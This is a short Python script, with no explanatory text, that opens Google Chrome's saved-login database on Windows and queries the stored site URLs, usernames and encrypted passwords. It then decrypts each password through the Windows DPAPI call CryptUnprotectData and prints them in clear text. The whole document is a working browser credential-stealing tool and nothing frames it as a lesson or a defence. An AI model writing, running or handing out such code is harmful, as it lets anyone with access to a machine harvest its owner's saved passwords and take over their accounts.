from os import getenv
import sqlite3
import win32crypt
import binascii
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    if password:
        print ('Site:'+result[0])
        print ('Username:'+result[1])
        print ('Password:'+str(password))
    else:
        print ('no password found')
